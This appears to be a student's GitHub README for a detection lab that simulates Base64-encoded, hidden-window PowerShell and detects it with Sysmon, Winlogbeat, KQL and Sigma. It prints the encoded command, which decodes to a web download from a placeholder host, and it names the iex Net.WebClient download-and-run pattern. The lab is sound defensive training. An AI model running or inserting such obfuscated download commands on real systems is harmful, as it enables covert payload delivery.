# SOC Detection Lab: Detecting Obfuscated PowerShell with Sysmon + ELK

Welcome to a hands-on **SOC detection engineering lab** that simulates real-world attacker behavior using **encoded PowerShell** and walks through how to detect it using **Sysmon**, **Winlogbeat**, and the **Elastic Stack** (ELK).

> This project was created to showcase my ability to simulate attacks, analyze telemetry, and build real-world detections as a SOC analyst or detection engineer.

---

## Lab Objective

- Simulate **obfuscated PowerShell execution** with `-EncodedCommand`
- Investigate endpoint logs using **Sysmon**
- Ship logs to a central SIEM using **Winlogbeat**
- Detect malicious behavior using **KQL and Sigma rules**

---

## Lab Environment

| Component | Description |
|----------|-------------|
| Windows 10 VM | Host for Sysmon + attack simulation |
| Sysmon + config | Advanced endpoint logging |
| Winlogbeat | Log shipper for Windows events |
| Elastic + Kibana | Centralized log storage and analysis |
| VS Code | Markdown documentation and repo management |

---

## Lab Walkthrough

| Step | Description |
|------|-------------|
| [`1_sysmon-setup.md`](lab-steps/1_sysmon-setup.md) | Installing Sysmon with a custom config |
| [`2_attack-simulation.md`](lab-steps/2_attack-simulation.md) | Simulating obfuscated PowerShell |
| [`3_log-investigation.md`](lab-steps/3_log-investigation.md) | Investigating logs in Event Viewer |
| [`4_winlogbeat-to-elk.md`](lab-steps/4_winlogbeat-to-elk.md) | Sending logs to ELK and detecting the attack |

---

## Simulated Attack

powershell
    powershell.exe -nop -w hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwADoALwAvAGUAbQBvAGMAawAvAGQAbwB3AG4AcwBjAHIAaQBwAHQAIgA=

Decoded Command:
    Invoke-WebRequest "http://emock/downloadscript"

## Detection Strategy 

| Technique | Description |
|----------|-------------|
| T1059.001 | Powershell |
| T1027 | Obfuscation |
| T1105 | Remote File Copy |

## KQL Detection (Kibana):

process.name: "powershell.exe" AND process.command_line: "*-EncodedCommand*"

## Sigma Rule:
    detections/powershell-encodedcommand.yml

## Screenshots:

Sysmon Event ID 1 showing obfuscated PowerShell
Base64 decoding in CyberChef
Kibana search result

See /screenshots folder

## What You'll Learn

Endpoint logging with Sysmon
Obfuscation techniques in PowerShell
Threat hunting using KQL
Building detection rules
Structing and documenting a SOC lab for GitHub

## About the Author 

Hi, I’m a cybersecurity student and hands-on learner passionate about threat detection and SOC workflows.

This lab is part of my growing portfolio of cybersecurity projects.
Want to collaborate or provide feedback? Feel free to reach out on GitHub!
Check out more projects and cybersecurity news at https://medium.com/@SamAchek


## Status

Lab is complete!

Future Ideas:
    Add detection for Powershell downloading via iex (New-Object Net.WebClient)
    Add alerting rule in Elastic Security
    Build out GRC-style executive report from this analysis

## License 
This project is open-sourced under the MIT License.
